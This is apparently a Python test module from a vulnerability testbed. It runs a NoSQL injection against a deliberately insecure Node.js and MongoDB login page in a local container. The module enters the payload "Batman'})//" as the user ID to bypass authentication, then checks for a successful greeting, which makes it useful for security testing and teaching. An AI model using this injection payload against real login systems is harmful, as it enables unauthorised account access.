from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

	attributes = {
	  'Name' :		  'NoSQLInjectionExploit',
	  'Description' : "SQL injection in MongoDB + node.js application.",
	  'References' :  [["empty"]],
	  'Target' :	  "nosqlinjection",
	  'Container': 'ubuntu-node-mongo',
	  'TargetLicense' : '',
	  'Plugin' : '',
	  'VulWikiPage' : "None",
	  'Type' : 'NoSQL injection'
	}


	def runExploit(self):
		w = self.wrapper
		w.navigate("http://localhost:%s/insecureLogin.html" % mapped_port_host)
		w.find("userid").keys("Batman'})//")
		w.find("submit").click()
		element = w.find("body")
		self.assertIn("Hello, Batman!", element.raw.text)
